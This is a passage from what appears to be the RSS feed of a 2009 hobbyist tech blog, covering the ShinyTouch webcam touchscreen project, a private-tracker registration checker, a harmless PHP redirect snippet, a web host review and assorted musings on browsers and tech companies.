&lt;p&gt;I’ve been watching some &lt;a href=&quot;http://www.youtube.com/user/googletechtalks&quot;&gt;google techtalks &lt;/a&gt;in the past few days, and I think it was interesting how the one on &lt;a href=&quot;http://www.youtube.com/watch?v=3xKZ4KGkQY8&quot;&gt;Wuala&lt;/a&gt; (a distributed filesystem) was started with the google guy saying “this talk is being recorded so please refrain from mentioning any google sensitive information in your questions”. While it may be referring to the &lt;a href=&quot;http://en.wikipedia.org/wiki/Google_File_System&quot;&gt;Google File System&lt;/a&gt;, I don’t think it’s too similar to &lt;a href=&quot;http://www.wuala.com/&quot;&gt;Wuala&lt;/a&gt;. So I think the idea of cloud storage distributed among peers is an attractive idea since what would you actually use the hard disk which most netbooks do have, and keeping all your data locally doesn’t really contribute to the whole idea to cloud computing.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>TUIO Support</title>
      <link>http://antimatter15.com/2009/08/tuio-support/</link>
      <pubDate>Sat, 01  Aug 2009 07:17:57 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/08/tuio-support/</guid>
      <author></author>
      <description>&lt;p&gt;So even though the algorithms that transform the calibration box aren’t working accurately yet, TUIO support has been made, so you can use apps like TUIO Mouse to control your computer and other touch demo things.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>ShinyTouch Images</title>
      <link>http://antimatter15.com/2009/08/shinytouch-images/</link>
      <pubDate>Sat, 01  Aug 2009 07:15:05 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/08/shinytouch-images/</guid>
      <author></author>
      <description>&lt;p&gt;This is the app running, notice that it’s not yet been calibrated yet.&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2009/ShinyTouch%20Images/screenshot_012_YR3t87.png&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;Here is the auto-calibration process, it alternates between black and white
&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2009/ShinyTouch%20Images/screenshot_011_wZ7Pn1.png&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;This is part of Auto-Calibration.
&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2009/ShinyTouch%20Images/screenshot_005_6MQO0S.png&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;This is some stuff from the command line:
&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2009/ShinyTouch%20Images/screenshot_007_2rbhHD.png&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;This is just hovering over the screen, notice it’s not touching, and the algorithm can distinctly recognize the lack of a touch because the reflection is seperated from the finger by a significant gap. (Compare the top red bar).
&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2009/ShinyTouch%20Images/screenshot_006_nV186Y.png&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;This is a actual touch, you can see that the red bar is far larger, and it’s very distinctly a touch event.
&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2009/ShinyTouch%20Images/screenshot_008_117vhL.png&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;There’s a draw tool and, here is a primitive drawing of a smiley. The dots come from an issue with PIL/OpenCV or something that makes the image all chopped up and sends the point to an arbitary point on the screen.
&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;http://antimatter15.com/misc/img/purty2009-07-21T19:23:30.080675.png&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;This is the magical sensor the whole thing is powered by: An unmodified Playstation 3 Eye on a tissue box with a pink Office Depot eraser on the back (because the camera is made tilted and the script can’t handle those tilts very well)
&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2009/ShinyTouch%20Images/screenshot_013_5jru8J.png&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;It’s not too insanely slow either. This is 31 frames per second coming from a pure python app, all from a scripting language. It is nowhere as fast as the normal fast native apps.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Private Tracker Registration Checker in Python</title>
      <link>http://antimatter15.com/2009/07/private-tracker-registration-checker-in-python/</link>
      <pubDate>Thu, 30 Jul 2009 21:33:51 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/07/private-tracker-registration-checker-in-python/</guid>
      <author></author>
      <description>&lt;p&gt;Well, I wanted a demonoid account for no apparent reason. So I wanted to search for private trackers, and found this app called &lt;a href=&quot;http://www.stamcar.com/2007/07/25/tracker-checker-2-public-preview/&quot;&gt;Tracker Checker 2&lt;/a&gt; It’s great and all, but it doesn’t work well on linux. Or at least for me, I run it and it pops up a window for a few milliseconds and then closes. There’s nothing in the tray but the process looks like it’s still running. So I looked at the trackers.xml file and thought it would be easy to create another one.&lt;/p&gt;
&lt;p&gt;So I quickly hacked together a python script that parsed the xml file and checked for trackers. For some reason, Demonoid said it was open while it was actually closed, so I made a little extension to the format.&lt;/p&gt;
&lt;p&gt;I’m actually probably not gonna use this, but I’ve made this private tracker registration checker app in python. It uses a trackers.xml file that is compatable with the &lt;a href=&quot;http://www.stamcar.com/2007/07/25/tracker-checker-2-public-preview/&quot;&gt;Tracker Checker 2&lt;/a&gt; app. It supports a slight extension to the protocol by being able to check if a certain phrase is &lt;em&gt;not&lt;/em&gt; in a page. It’s multithreaded and uses expat for xml parsing and urllib2 to download the pages.&lt;/p&gt;
&lt;p&gt;I think it would be pretty cool to integrate it with XMPP and port it to Google App Engine, and send out alerts to people when trackers are open.&lt;/p&gt;
&lt;p&gt;It has no UI, it’s just a little command line app that could be used as a cron job and integrated with XMPP.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://antimatter15.com/misc/trackerchecker.tar.gz&quot;&gt;Download here&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>ShinyTouch is 1 month old</title>
      <link>http://antimatter15.com/2009/07/shinytouch-is-1-month-old/</link>
      <pubDate>Tue, 28 Jul 2009 01:33:57 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/07/shinytouch-is-1-month-old/</guid>
      <author></author>
      <description>&lt;p&gt;For as long as my notes show, ShinyTouch is now 1 month old.&lt;/p&gt;
&lt;p&gt;So today, I added VideoCapture support, so it will now work better on Windows.&lt;/p&gt;
&lt;p&gt;Auto calibration has been rewritten, and a few other small changes.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>ShinyTouch Auto-Calibration</title>
      <link>http://antimatter15.com/2009/07/shinytouch-auto-calibration/</link>
      <pubDate>Sat, 25 Jul 2009 07:01:41 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/07/shinytouch-auto-calibration/</guid>
      <author></author>
      <description>&lt;p&gt;A few days ago I started working on auto calibration for shinytouch. Someone worked it a bit brfire and gave some PyGTK code that did fullscreen correctly but I ended up getting too confused (especially with embedding the video and images and threading delays). So now I started from scratch (or moreover continuing with using pygame) and now it is inherently not full screen. The auto calibration works by setting the contents of he window to be one color and taking a snapshot. After that the color is changes again and the snapshot is once again recorded. After gathering a pair, the software compares them pixel by pixel. It takes multiple trials and takes the average.&lt;/p&gt;
&lt;p&gt;Then there is a function that makes cool stuff happen. It goes right to left to search for massive groups of consecutively marked hot pixel change areas. Ir searches for a general trapezoidal shape. And takes the lenghs and heights and positions. And right now, typing on my iPhone I wish the spell corrector was as awesome as the google wave contextual system.
So in the near future, shinytouch will be as simple as launchingthe app and hitting a calibrate button and the computer does the rest. Maybe it might ask you to touch the screen in a special magic box or click on your finger afterwards but overall, zero setup and almost no calibration.
So on another note, shinytouch is now almost a month old idea-wise. In my idea book, the references to it date back to June 28, though it may have originated a few days prior. For shinytouch the beginning window is quite a bit more broad. Anywhere from last year to march. I seem to recall late January experimentation with mirrors.
So now,
With shinytouch being the more promising (more acessible and radical) I have stalled development on mirrortouch. It’s quite annoying how fast time passes. There is so much that I really want to do but there is nost not enough time.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Ajax Animator + Vector Editor</title>
      <link>http://antimatter15.com/2009/07/ajax-animator-vector-editor/</link>
      <pubDate>Fri, 24 Jul 2009 07:00:33 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/07/ajax-animator-vector-editor/</guid>
      <author></author>
      <description>&lt;p&gt;So yesterday, I worked a little on making a VectorEditor based Ajax Animator. It actually took suprisingly little work. The mostly modular and abstracted design of the Ajax Animator means that only a few files need to be changed. Mainly those in the js/drawing directory. Though there was a bunch of references to Ax.canvas.renderer.removeAll() which needed to be changed.&lt;/p&gt;
&lt;p&gt;Another cool feature in that version is the ability to have layers show up concurrently. So you can see things while drawing just as they would be in export.&lt;/p&gt;
&lt;p&gt;However, it’s not ready, it’s very very buggy, Lines and Paths aren’t tweenable yet, and it’s missing all those nice features of OnlyPaths that VectorEditor inherently lacks.&lt;/p&gt;
&lt;p&gt;But the one really nice feature I think is the multi select. You can easily select a group of things which comprise some sort of shape, and move it all across.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>How I would design a touchscreen browser</title>
      <link>http://antimatter15.com/2009/07/how-i-would-design-a-touchscreen-browser/</link>
      <pubDate>Fri, 24 Jul 2009 06:53:43 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/07/how-i-would-design-a-touchscreen-browser/</guid>
      <author></author>
      <description>&lt;p&gt;This is again, an old idea of mine, I drew it on a sheet of paper maybe a year ago, but I just remembered it.&lt;/p&gt;
&lt;p&gt;A common theme with modern browser is maximizing screen estate (which I don’t actually care about, becasue I have 2 huge monitors). But if I were to have a netbook or some otherwise technically restrained device, I would think that screen estate is important.&lt;/p&gt;
&lt;p&gt;My Idea is pretty cool. The idea is that there is only a tab bar on top. It’s as usual, allocated to the tabs, and there is on the side, a new tab button. But for this, the new tab button occupies the entire rest of the space of the tab bar, because space is precious. Sort of like the Mozilla Fennec browser.&lt;/p&gt;
&lt;p&gt;forward and backwards navigation is achieved by throwing (not just gentle pushing, throwing, it should be kinetic, if you don’t thow hard enough, it just shows some text saying the equivalent of “throw harder!”).&lt;/p&gt;
&lt;p&gt;At least in the way I browse, I don’t enter URLs often unless I’m on about:blank. So there is no URL bar. To find what URL you’re on, or to enter a new one, simply double tap on the current tab. It expands and fills the tab bar with a text box and the other tabs are condensed to icons.&lt;/p&gt;
&lt;p&gt;Swiping down shows a drop-down for a tab with options to do things like bookmark or view source.&lt;/p&gt;
&lt;p&gt;Thowing a tab down (which is a more violent swipe) removes the tab. Something partly inspired by the Mac OS X dock.&lt;/p&gt;
&lt;p&gt;The new tab button could also be a menu, swiping down to reveal a menu of bookmarks to select from.&lt;/p&gt;
&lt;p&gt;And the new tab page could be almost like a desktop. with widgets, gadgets and whatever (Google wave? If only I got my dev invite :’(). Well, in my idea, the top portion of the new tab page could be the URL bar and the rest could be whatever other browsers are doing + maybe some widgets/gadgets Dashboard or Plasma style.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Vector Editor Google Code Project Page</title>
      <link>http://antimatter15.com/2009/07/vector-editor-google-code-project-page/</link>
      <pubDate>Wed, 22 Jul 2009 04:59:56 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/07/vector-editor-google-code-project-page/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;http://jsvectoreditor.googlecode.com/&quot;&gt;http://jsvectoreditor.googlecode.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;There’s the project page! If you want to try it out, the link is below. It’s only been tested on Firefox 3.0 so far, and please comment if there are any issues.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jsvectoreditor.googlecode.com/svn/trunk/index.html&quot;&gt;http://jsvectoreditor.googlecode.com/svn/trunk/index.html&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>New ShinyTouch Algorithms</title>
      <link>http://antimatter15.com/2009/07/new-shinytouch-algorithms/</link>
      <pubDate>Tue, 21 Jul 2009 02:18:33 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/07/new-shinytouch-algorithms/</guid>
      <author></author>
      <description>&lt;p&gt;The algorithms are nearing completion. They now function most of the time and are fairly situation-agnostic and mostly zero-config.&lt;/p&gt;
&lt;p&gt;A cool new thing it does now is using the HSV color space rather than the RGB one and comparing the hue values. It turns out that this creates the most noticable difference between colors and it can easily tell different colors and shapes apart.&lt;/p&gt;
&lt;p&gt;There is also a new shape-detection system, because all previous ones checked colors. This works by getting a sample of the finger color and the background color and comparing the closeness of surrounding pixels to each one. It ends when it finds a pixel closer to the bg than the finger. This one is truly zero config.&lt;/p&gt;
&lt;p&gt;Another one checks the similarities in hue of the alleged reflection color and the known bg color. If it’s not similar enough, then it is recognized as a touch. It does use some configuration, but it shouldn’t vary much from situation-to-situation to require serious configuration.&lt;/p&gt;
&lt;p&gt;There is also a new failure, which is generating a supposed ideal sum ratio to detect things (which is how the newly old one worked backwards). Though it spawned a new version that uses HSV instead, and it works pretty well.&lt;/p&gt;
&lt;p&gt;Also, almost all the functions now create bar-graph visualizations. Very futuristic and augmented-reality style.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>The interesting order of digital communication paradigms</title>
      <link>http://antimatter15.com/2009/07/the-interesting-order-of-digital-communication-paradigms/</link>
      <pubDate>Wed, 15 Jul 2009 06:23:23 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/07/the-interesting-order-of-digital-communication-paradigms/</guid>
      <author></author>
      <description>&lt;p&gt;So about 2 Months ago I realized something quite interesting. It is that digital communication is creating new paradigm shifts (if I may call them that without all singularity theorists attacking me) in the order of the evolution of human communications - backwards.&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;A historic technological achievement  yet a recent human one&quot;  src=&quot;/articles/2009/The%20interesting%20order%20of%20digital%20communication%20paradigms/blue-screen-2.jpg&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;What? How is progress backwards? Well, think about it, just about the first type of digital communication was through text (computing may have existed prior to that using buttons and switches which could be argued, but I’m going to say that they weren’t real communication methods but rather just computing methods). Text, is written language and historically, written language is quite a recent invention. I may be thinking of telegrams or maybe I could just start with computer communication, but the point remains.
What’s next? Well, after telegrams, people invented telephone, the logical successor. After the book was invented the radio. Even before text was totally phased out from computers, sound was there (this part is a assumption because you might have realized my age so I was never alive before the era of GUIs and Windows 95). But if you think of it, human written language was preceded by spoken language. You can see evidence even today with many developing countries having illiterate people. That usually means they don’t write but can speak.
Preceding human speech is gestures and behaviors. Like recognizing that a tiger is chasing you, and running and having others interpret the message as: “hmm.. I should run too…”. These gestures, albeit historically primitive have not been captured in digital communications technology until the development of video. This development happened after the development of telephones. It is now the focus of things like YouTube and Skype. Quite recent advancements in technology that is just now being implemented. Gestures aren’t now just being developed in the form of video but also the cool natural user interfaces (again, natural not just because they feel natural to the user, but primitive data formats with less technology, ironically implemented with technology). Multi Touch, 3d tracking and gesture recognition are big in the news today; the Wii, Natal, Jeff Han, Surface, FTIR, DI,  LaserTouch, LLP, PS3 eye (LOL my iPhone just autocorrected that as “pee”) and I couldn’t leave out a plug for my ideas, ShinyTouch and MirrorTouch.&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;Yay for a random picture of the technology singularity?&quot;  src=&quot;/articles/2009/The%20interesting%20order%20of%20digital%20communication%20paradigms/400px-ParadigmShiftsFrr15Events.svg.png&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;This isn’t some magical scheme of such to prove some error sort of divine creationism. No, this is a quite logical example of how human evolution interacts with technology, a world governed by Moore’s law (or something else like Kurzweil’s law since Gordon Moore might not want to be associated with everything suffering from exponential growth). Technology is built around the limitations of the age. One of the original a d ongoing issues is bandwidth. Text uses only 8 bits per character. Sound requires several hundred kilobits per second. Video requires an exponential leap with something  like 32 bits times 640 times 480 times 30 bits of data per second. I don’t have a calculator now but you can quite easily understand how 32&lt;em&gt;640&lt;/em&gt;480*30 is big. &lt;em&gt;I’ve now calculated it to be somewhere around 211,968,000 bits per second, and that’s quite a bit bigger than audio.&lt;/em&gt; So it’s just that humans logically evolve more efficient and dense formats of communication, while digital technology just reduces bottlenecks and enable for the more primitive yet more data intensive communication systems to be implemented.
Now for what’s interesting: the future. Now that we know the pattern of communication progresses backwards, what predates gestures? Well, I think it’s obvious, but never really been in reach of exploiting it directly. It’s never even itself been use as a communication substrate. And extrapolating the rest of the above noted correlations, it fits as something that requires unprecedented large bandwidth and computing. It’s more natural than anything else because it is moreso innate than learned. It’s thing that lies below all of that. It’s direct thought.
Nothing comes more naturally to a human to thinking. We have evolved in recent (on the evolutionary timescale) years to have a massive ballooning of skull size, hopefully to make way for that Grey matter that goes in it. Thinking is something people do, and it’s universal. Neurons are not French or German, American or British, Chinese or African, northern or southern, accented or racist, wise or dumb, experienced (they may be old, but they don’t gain experience with age) or a n00b. They are just simple circuits that process and store data, passing it along in a giant, organic neural network. We are all born with them and they are always roughly alike. It is the ultimate in natural and innate thinking.&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;OM NOM NOM on ur brainz!&quot;  src=&quot;/articles/2009/The%20interesting%20order%20of%20digital%20communication%20paradigms/Emotiv_3_540x416-714452.jpg&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;And there is evidence that it is currently being seriously considered. MRI scanning has greatly increased scanning resolution in recent years and EGG machines are now being developed further and being commercialized with companies like OCZ with their Neural Actuator or Emotiv’s EPOC product. So it is likely the next and as far as I can tell, the final communication paradigm.
This is now the third blog post from my iPhone. But this time I did some editing on my computer.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>TwitMon Twitter Trending Topics Notifier in Jetpack</title>
      <link>http://antimatter15.com/2009/07/twitmon-twitter-trending-topics-notifier-in-jetpack/</link>
      <pubDate>Wed, 15 Jul 2009 05:55:37 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/07/twitmon-twitter-trending-topics-notifier-in-jetpack/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2009/TwitMon%20Twitter%20Trending%20Topics%20Notifier%20in%20Jetpack/twitter_fail_whale.jpg&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;I don&quot;  src=&quot;/articles/2009/TwitMon%20Twitter%20Trending%20Topics%20Notifier%20in%20Jetpack/twitter_fail_whale-300x225.jpg&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Fail Whale&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://antimatter15.com/misc/jetpack/twitter/twitmon.html&quot;&gt;http://antimatter15.com/misc/jetpack/twitter/twitmon.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Since all news nowadays comes from twitter, I promised myself I would make something to keep up on the new tweets since I’m no longer an active user or follower. And BTW, don’t follow me (until i say so or something).&lt;/p&gt;
&lt;p&gt;So it’s a jetpack add-on that queries twitter using it’s JSON API every 3.14159 minutes. It uses the Jetpack notification API to display new items whenever they come up.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>New Site!</title>
      <link>http://antimatter15.com/2009/07/new-site/</link>
      <pubDate>Mon, 13 Jul 2009 21:15:00 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/07/new-site/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2009/New%20Site!/newblogscreenie.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;Yay! A picture of the blog and this article  maybe I should try making it include the picture and it can be a infinite loop of manual recursiony awesomeness!&quot;  src=&quot;/articles/2009/New%20Site!/newblogscreenie-300x176.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;New Blog Screenie&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;You may notice that the site is now using my actual domain! and that it’s also like twice as fast and 20 times more reliable! Also, the URLs are now insanely awesome rather than the ?p=314159 or something random like that.
That’s because I have a new host and this is a new site with WordPress 2.8.1 and stuff.
One thing I momentarily have forgotten is Ads (don’t you love them?). So they’ll be back soon.
I also have a new theme, based on the SimpleX and Carrington Blog themes.
I went back hundred or so posts and added catagories and tags to them for ease of navigation. I created new pages for Wikify, vXJS, ShinyTouch and MirrorTouch and I have a few new posts.
So I’d like to see your feedback on the new site.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Redirect referred users to new site's respective page</title>
      <link>http://antimatter15.com/2009/07/redirect-referred-users-to-new-site-s-respective-page/</link>
      <pubDate>Mon, 13 Jul 2009 21:09:28 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/07/redirect-referred-users-to-new-site-s-respective-page/</guid>
      <author></author>
      <description>&lt;p&gt;So as you may know, I have moved to a new host and I need to move all things over so I made this awesome script that I hacked together to redirect all users visiting the old site to the new site and the respective page as long as they are being referred from a third party.&lt;/p&gt;
&lt;p&gt;It’s pretty short and goes at the top of index.php. Probably won’t be useful to anyone but whatever :)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='php'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;isset&lt;/span&gt;(&lt;span class=&quot;hljs-variable&quot;&gt;$_SERVER&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;'HTTP_REFERER'&lt;/span&gt;]) &amp;amp;&amp;amp; strpos(&lt;span class=&quot;hljs-variable&quot;&gt;$_SERVER&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;'HTTP_REFERER'&lt;/span&gt;],&lt;span class=&quot;hljs-string&quot;&gt;&quot;antimatter15&quot;&lt;/span&gt;) === &lt;span class=&quot;hljs-keyword&quot;&gt;FALSE&lt;/span&gt;){
  header( &lt;span class=&quot;hljs-string&quot;&gt;&quot;HTTP/1.1 301 Moved Permanently&quot;&lt;/span&gt; ); 
  header(&lt;span class=&quot;hljs-string&quot;&gt;&quot;Location: ?&quot;&lt;/span&gt;.&lt;span class=&quot;hljs-variable&quot;&gt;$_SERVER&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;'QUERY_STRING'&lt;/span&gt;]);
  &lt;span class=&quot;hljs-keyword&quot;&gt;die&lt;/span&gt;();
}
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>ShinyTouch ideas</title>
      <link>http://antimatter15.com/2009/07/shinytouch-ideas/</link>
      <pubDate>Mon, 13 Jul 2009 07:22:21 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/07/shinytouch-ideas/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2009/ShinyTouch%20ideas/l_256_241_985F88AA-12C1-4F04-A56D-1A726CB6854C.jpeg&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;Is this the end goal of ShinyTouch?&quot;  src=&quot;/articles/2009/ShinyTouch%20ideas/l_256_241_985F88AA-12C1-4F04-A56D-1A726CB6854C.jpeg&quot; &gt;&lt;div class=&quot;caption&quot;&gt;l_256_241_985F88AA-12C1-4F04-A56D-1A726CB6854C.jpeg&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;One potential I see for shinytouch is the ability for it to be embedded in a flash application which can be embedded into a web page. Then there could be a web 2.0 style JS API for awesome canvas tag based creations. Or it could just be used to interact with another flash application or game.
The reason why this is more likely able to be used as such is because setup for this is so easy that this could actually convince people to do it. With other systems you really have to convince people really well to be dedicated enough to set up the hardware whatever it is. At that point, the software is the easy part and the audience is more than glad to go through the hassle of downloading, running, configuring, and maybe even compiling.
But with shinytouch aiming at a different, larger and overall lazier (myself included in this group) audience. This means that it is really important to lower the entry barrier to the lowest possible level. I think being able to just move the webcam a little bit, go to a website and follow simple directions to use their own touchscreen is a very potentially attractive concept. It could even spawn more interest in the touchscreen, natural user interface communities.
This is really what I want he project to end up like. It seems quite practical to me. How do you feel about this?&lt;/p&gt;
&lt;p&gt;(note that this is my second post entirely from my iPhone)&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Dreamhost</title>
      <link>http://antimatter15.com/2009/07/dreamhost/</link>
      <pubDate>Mon, 13 Jul 2009 06:05:23 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/07/dreamhost/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;Dreamhost is pretty good. Maybe my expectations are low?&quot;  src=&quot;/articles/2009/Dreamhost/l_300_300_15C97183-86EE-4988-A495-C212B230EBC0.jpeg&quot; &gt;&lt;div class=&quot;caption&quot;&gt;l_300_300_15C97183-86EE-4988-A495-C212B230EBC0.jpeg&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;So now I have a cool new web host: Dreamhost. I’ll be using it for at least the next year. So far it’s really great. It has everything I really wanted which isn’t much (aside from SSH access).
Sure, it’s a massive overseller which has quite sky-high pricing for the purpose of bailing out really insanely cheap promotions, but I haven’t yet faced any problems with it. And may I mention that I’m largely a member because of one of their insanely cheap promotions? Don’t get me wrong, I did do tons of research prior and it seemed good to begin with, but the whole July Fourth $10 for hosting a whole year is pretty irrefutably awesome.  decently fast. It actually supports URLs without a WWW (which was the reason this blog never used GoDaddy).
So what issues have I faced so far? Well, not many. And since setting up is usually the most troublesome and hard part, it’s setting a good precedent in my mind. Issues ive has aren’t really hosting related.
The control panel is actually really good. I don’t know why, but I really can’t stand using CPanel. I haven’t had a very good experience with it. They try far too much to make everything as if it’s intended to be something like your Netvibes or iGoogle homepage. And CPanel is remarkably unhelpful with issues (that I’ve had with SSH) and it wastes a lot of screen estate on listing basic server info that rarely changes or is useful in any way. The Dreamhost panel by comparison is menu based and intuitive. No big icons that make you feel stupid after looking for a long time and realizing it’s a huge icon in the center of the screen involving outdated and vague old desktop metaphors. Just simple menus. Sometimes it’s not very good at explaining why it switches PHP to CGI mode when you use the automatic installer. I wouldn’t reccomend it’s automated installer though. While I’ve had very few problems with using it to install the latest version of Wordpress, the configuration is a bit lacking. Also, the generated wp_config.php from the automated installer is old and actually missing a few security features that makes it harder (just add the missing lines in) to install BBPress later on. Beside that, installing Trac+SVN may be only a dew clicks to do, but getting Trac to behave as expected (logging in) requires tedious amounts of command-line-fu. The installation options are seriously quite mediocre and they use big icons too. There are only like 9 available scripts with only a few CMSes a gallery or two and some eCommerce.
I can’t really do a summary, but it’s pretty good as of now.
Oh and another cool thing is that this entire post was written on my iPhone. Yes. On a touchscreen device with a virtual keyboard. And that’s not bad either. I’m typing quite fast on this device and not making too many mistakes either. The reason the first post from my iPhone came so latenis because Wordpress for iPhone didn’t work on my old web host, but it works on my new one.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Google and Microsoft</title>
      <link>http://antimatter15.com/2009/07/google-and-microsoft/</link>
      <pubDate>Mon, 13 Jul 2009 03:18:59 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/07/google-and-microsoft/</guid>
      <author></author>
      <description>&lt;p&gt;Microsoft and Google have fundamentally different in their business models. Google uses Advertising and Search, with around 98% of their revenue comming from Advertising. Microsoft owns a monopoly on the Operating System business. Especially with the new Google Chrome OS that’s been recently announced, It really brings the question of their positions. Can Google really take Microsoft down? What kind of financial prowess, consumer brand loyalty or user lock-in does it really need to take on Microsoft?&lt;/p&gt;
&lt;p&gt;Google is on much shakier territory. I could leave Google just by typing in “bing.com” or “yahoo.com” in the URL bar. Simple as that. Totally intuitive, something that (hopefully) nobody needs to call Tech Support to guide them. Typing 8 letters into the URL bar and pressing enter is all it takes to destroy the Google empire.&lt;/p&gt;
&lt;p&gt;However, what about Microsoft. They own a monopoly on the Operating System market. How easy is it to install another operating system? Well, you need about 1-4GB of data for a modern OS, you need to either burn it or buy it from a store (I figure there are probably tons of tech support calls at this point), and then likely reconfigure BIOS, go through menus, fill out several forms and select the specific partition to install the OS to. This point is already unfathomable for a great majority of the userspace.&lt;/p&gt;
&lt;p&gt;Google is very different from Microsoft, from their core business models. The Windows monopoly isn’t going anywhere in the near future. Google could be gone tomorrow.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>vX JS Library</title>
      <link>http://antimatter15.com/2009/07/vx-js-library/</link>
      <pubDate>Mon, 13 Jul 2009 01:37:33 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/07/vx-js-library/</guid>
      <author></author>
      <description>&lt;p&gt;vX is the world’s smallest Javascript library. It’s modular, powerful, unlikely to interfere with operations of other libraries, open source (MIT license), and cross-browser. It’s designed with size first and foremost and everything else secondary. The cross-browser GET/POST AJAX function with callbacks is only 200 bytes. The closest thing is over twice the size. This extreme density is present in every function of the library.&lt;/p&gt;
